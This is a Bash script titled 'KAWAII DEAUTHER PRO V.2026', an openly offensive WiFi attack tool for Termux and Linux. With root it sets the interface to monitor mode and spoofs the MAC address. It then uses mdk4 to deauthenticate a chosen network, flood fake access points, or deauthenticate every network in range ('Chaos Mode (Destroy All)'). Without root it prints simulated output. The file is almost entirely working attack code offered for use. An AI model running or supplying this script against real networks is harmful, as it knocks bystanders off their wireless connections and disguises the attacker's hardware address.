#!/bin/bash

# ============================================================
# Project  : KAWAII DEAUTHER PRO V.2026 (Rolandino Edition)
# Author   : Rolandino (SPY-E / 123Tool)
# Platform : Termux (Root/Non-Root), Linux, WSL2
# Fungsi   : Deauth Target, Beacon Flood (Spam), Chaos Mode
# ============================================================

# --- Colors ---
GR='\033[0;32m'; RD='\033[0;31m'; YW='\033[1;33m'; CY='\033[0;36m'
WH='\033[1;37m'; NT='\033[0m'; BD='\033[1m'; BG='\033[44m'

function banner() {
    clear
    echo -e "${CY}${BD}╭━━━━┳╮╭━━━━┳━━━┳━━━━┳━━━┳━━━╮${NT}"
    echo -e "${CY}${BD}┃╭╮╭╮┃┃┃╭╮╭╮┃╭━╮┃╭╮╭╮┃╭━╮┃╭━╮┃${NT}"
    echo -e "${CY}${BD}╰╯┃┃╰┫╰╯╯┃┃╰┫┃ ┃╰╯┃┃╰┫╰━╯┃╰━━╮${NT}"
    echo -e "${YW}${BD}  ┃┃  ┃╭╮┃┃┃  ┃╰━╯┃  ┃┃  ┃╭╮╭┻━━╮┃${NT}"
    echo -e "${YW}${BD}  ┃┃  ┃┃┃╰┫┃  ┃╭━╮┃  ┃┃  ┃┃┃╰┫╰━╯┃${NT}"
    echo -e "${RD}${BD}  ╰╯  ╰╯╰━╯╯  ╰╯ ╰╯  ╰╯  ╰╯╰━┻━━━╯${NT}"
    echo -e "${WH}   [ KAWAII DEAUTHER V1.5 - BY ROLANDINO ]${NT}"
    echo -e "${CY}=============================================${NT}"
}

# --- Detection Mode (Root vs Non-Root) ---
if [[ $EUID -ne 0 ]]; then
   MODE="SIMULATION (Non-Root)"
   COLOR_MODE=$YW
else
   MODE="REAL ATTACK (Root)"
   COLOR_MODE=$GR
fi

# --- Dependencies Checker ---
function check_deps() {
    if [[ "$MODE" == "REAL ATTACK (Root)" ]]; then
        echo -e "${YW}[*] Checking weapons...${NT}"
        TOOLS=(mdk4 macchanger iw nmcli)
        for tool in "${TOOLS[@]}"; do
            if ! command -v $tool &> /dev/null; then
                echo -e "${RD}[!] $tool missing. Installing...${NT}"
                if [ -d "/data/data/com.termux/files/usr" ]; then
                    pkg install $tool -y
                else
                    sudo apt-get install $tool -y
                fi
            fi
        done
    fi
}

# --- Monitor Mode Setup ---
function start_monitor() {
    echo -e "${GR}[+] Setting $1 to Monitor Mode...${NT}"
    ip link set $1 down
    iw dev $1 set type monitor
    ip link set $1 up
    macchanger -r $1 | grep "New MAC"
}

# --- Main Menu ---
banner
check_deps
echo -e "${WH}Status: ${COLOR_MODE}$MODE${NT}"

# Interface Selector
interfaces=($(ls /sys/class/net | grep -E "wlan|wlp|wlx"))
if [[ ${#interfaces[@]} -eq 0 && "$MODE" == "REAL ATTACK (Root)" ]]; then
    echo -e "${RD}[!] No WiFi Interface Found!${NT}"
    exit 1
fi

echo -e "\n${CY}Available Interfaces:${NT}"
for i in "${!interfaces[@]}"; do
    echo -e " [${YW}$i${NT}] ${interfaces[$i]}"
done
[[ "$MODE" == "SIMULATION (Non-Root)" ]] && echo -e " [${YW}0${NT}] wlan0 (Simulated)"

read -p "Select Interface Index >> " iface_idx
selected_iface=${interfaces[$iface_idx]:-"wlan0mon"}

while true; do
    banner
    echo -e "${WH}Iface: ${GR}$selected_iface ${NT}| ${WH}Mode: ${COLOR_MODE}$MODE${NT}"
    echo -e "\n${CY}--- COMMAND CENTER ---${NT}"
    echo -e " [${YW}1${NT}] Takedown SSID (Deauth)"
    echo -e " [${YW}2${NT}] Spam Fake AP (Beacon Flood)"
    echo -e " [${YW}3${NT}] Chaos Mode (Destroy All)"
    echo -e " [${YW}4${NT}] Exit${NT}"
    read -p "Action >> " opt

    case $opt in
        1)
            if [[ "$MODE" == "SIMULATION (Non-Root)" ]]; then
                echo -e "${YW}[*] Scanning...${NT}"; sleep 2
                echo -e "${GR}Found Target: WiFi_Testing_2026${NT}"
                read -p "Target SSID: " t_ssid
                while true; do echo -e "${RD}[SIM] Sending Deauth to $t_ssid... [CTRL+C to stop]${NT}"; sleep 0.5; done
            else
                nmcli dev wifi rescan && sleep 2
                nmcli -f "SSID,BSSID,CHAN,BARS" dev wifi
                read -p "Enter Target SSID: " t_ssid
                start_monitor $selected_iface
                mdk4 $selected_iface d -n "$t_ssid"
            fi
            ;;
        2)
            if [[ "$MODE" == "SIMULATION (Non-Root)" ]]; then
                echo -e "${GR}[+] Reading list.txt...${NT}"; sleep 1
                while true; do echo -e "${CY}[SIM] Broadcasting SSID: 'Darkness' [Success]${NT}"; sleep 0.3; done
            else
                read -p "Wordlist name (Default: list.txt): " wlist
                wlist=${wlist:-list.txt}
                start_monitor $selected_iface
                mdk4 $selected_iface b -f $wlist -a -s 1000
            fi
            ;;
        3)
            if [[ "$MODE" == "SIMULATION (Non-Root)" ]]; then
                while true; do echo -e "${RD}[SIM] CHAOS MODE: Hopping Channel $((RANDOM%13))...${NT}"; sleep 0.2; done
            else
                start_monitor $selected_iface
                mdk4 $selected_iface d
            fi
            ;;
        4)
            echo -e "${GR}Exiting... Arigato!${NT}"
            exit 0
            ;;
    esac
done
